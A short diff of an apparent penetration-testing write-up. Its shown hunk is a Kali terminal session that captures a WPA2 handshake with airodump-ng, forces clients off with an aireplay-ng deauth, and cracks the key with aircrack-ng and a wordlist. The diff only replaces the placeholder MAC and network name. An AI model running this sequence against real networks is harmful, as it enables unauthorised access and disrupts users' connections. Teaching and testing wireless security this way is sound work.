@@ -30,10 +30,10 @@ The pipeline, start to finish:
 operator@kali:~$ sudo airmon-ng start wlan0                 # → wlan0mon (monitor mode)
 operator@kali:~$ sudo airodump-ng wlan0mon                  # survey: find the target BSSID + channel
  BSSID              CH  ENC   ESSID
- AA:BB:CC:11:22:33   6  WPA2  CorpWiFi
-operator@kali:~$ sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w cap wlan0mon
- ... [ WPA handshake: AA:BB:CC:11:22:33 ]   ← captured!
-operator@kali:~$ sudo aireplay-ng --deauth 3 -a AA:BB:CC:11:22:33 wlan0mon   # (force a reconnect)
+ 00:00:5E:00:53:C0   6  WPA2  MERIDIAN-CORP
+operator@kali:~$ sudo airodump-ng -c 6 --bssid 00:00:5E:00:53:C0 -w cap wlan0mon
+ ... [ WPA handshake: 00:00:5E:00:53:C0 ]   ← captured!
+operator@kali:~$ sudo aireplay-ng --deauth 3 -a 00:00:5E:00:53:C0 wlan0mon   # (force a reconnect)
 operator@kali:~$ aircrack-ng -w rockyou.txt cap-01.cap
  KEY FOUND! [ Summer2024! ]
 ```
